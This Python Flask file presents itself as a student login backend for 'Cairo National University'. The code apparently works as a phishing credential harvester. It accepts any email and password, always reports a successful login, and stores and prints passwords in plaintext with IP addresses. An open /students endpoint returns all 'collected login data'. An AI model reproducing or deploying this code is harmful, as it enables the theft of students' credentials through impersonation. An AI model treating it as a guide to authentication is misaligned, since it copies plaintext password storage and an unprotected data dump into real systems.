"""
Cairo National University - Student Login Backend
Flask + SQLite
Run: python app.py
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import io
from datetime import datetime
from contextlib import contextmanager

import libsql

app = Flask(__name__)
CORS(app)  # Allow requests from the HTML frontend

TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL") or os.getenv("LIBSQL_URL")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN") or os.getenv("LIBSQL_AUTH_TOKEN")

# ── DATABASE SETUP ────────────────────────────────────────────────────────────

@contextmanager
def get_db():
    if not TURSO_DATABASE_URL or not TURSO_AUTH_TOKEN:
        raise RuntimeError("TURSO_DATABASE_URL and TURSO_AUTH_TOKEN must be set")

    conn = libsql.connect(
        TURSO_DATABASE_URL,
        auth_token=TURSO_AUTH_TOKEN
    )

    try:
        yield conn
    finally:
        conn.close()


def fetchone_dict(conn, query, params=()):
    cur = conn.execute(query, params)
    row = cur.fetchone()
    if row is None:
        return None
    cols = [d[0] for d in cur.description] if cur.description else []
    return dict(zip(cols, row))


def fetchall_dicts(conn, query, params=()):
    cur = conn.execute(query, params)
    rows = cur.fetchall()
    cols = [d[0] for d in cur.description] if cur.description else []
    return [dict(zip(cols, r)) for r in rows]

def init_db():
    """Create the students table if it doesn't exist."""
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS students (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                email       TEXT    NOT NULL,
                password    TEXT    NOT NULL,
                ip_address  TEXT,
                login_count INTEGER DEFAULT 1,
                first_login TEXT    NOT NULL,
                last_login  TEXT    NOT NULL
            )
        """)
        conn.commit()
    print("[DB] Database initialised ✓")

# ── ROUTES ────────────────────────────────────────────────────────────────────

@app.route("/login", methods=["POST"])
def login():
    """
    Accept any email + password.
    If email is new  → INSERT a new student record.
    If email exists  → UPDATE last_login and login_count.
    Always returns 200 so the user is 'logged in'.
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid request body"}), 400

    email    = (data.get("email", "") or "").strip().lower()
    password = (data.get("password", "") or "").strip()

    if not email or not password:
        return jsonify({"error": "Email and password are required"}), 400

    ip  = request.remote_addr
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with get_db() as conn:
        row = fetchone_dict(
            conn,
            "SELECT id, login_count FROM students WHERE email = ? AND password = ?",
            (email, password),
        )

        if row is None:
            # New student record for this email/password pair
            conn.execute("""
                INSERT INTO students (email, password, ip_address, first_login, last_login)
                VALUES (?, ?, ?, ?, ?)
            """, (email, password, ip, now, now))
            conn.commit()
            print(f"[NEW]  {email} | pwd: {password} | ip: {ip} | {now}")
            action = "registered"
        else:
            # Returning student with same email/password → update login metadata only
            conn.execute("""
                UPDATE students
                SET last_login  = ?,
                    login_count = login_count + 1,
                    ip_address  = ?
                WHERE id = ?
            """, (now, ip, row["id"]))
            conn.commit()
            print(f"[RTRN] {email} | pwd: {password} | ip: {ip} | {now} (login #{row['login_count']+1})")
            action = "logged_in"

    return jsonify({
        "success": True,
        "action": action,
        "message": "Login successful"
    }), 200


@app.route("/students", methods=["GET"])
def list_students():
    """
    Admin endpoint — view all collected login data.
    Access via: http://localhost:5000/students
    """
    with get_db() as conn:
        students = fetchall_dicts(
            conn,
            "SELECT id, email, password, ip_address, login_count, first_login, last_login FROM students ORDER BY id DESC",
        )
    return jsonify({
        "total": len(students),
        "students": students
    }), 200


@app.route("/portal", methods=["GET"])
def portal():
    return send_file("index.html")


# ── DATABASE INITIALIZATION ───────────────────────────────────────────────────

# Create tables if they don't exist
with app.app_context():
    init_db()

# ── ENTRY POINT ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 55)
    print("  Cairo National University — Backend Server")
    print("  Running on  : http://localhost:5001")
    print("  Admin panel : http://localhost:5001/students")
    print("=" * 55)
    app.run(debug=False, host="0.0.0.0", port=5001)
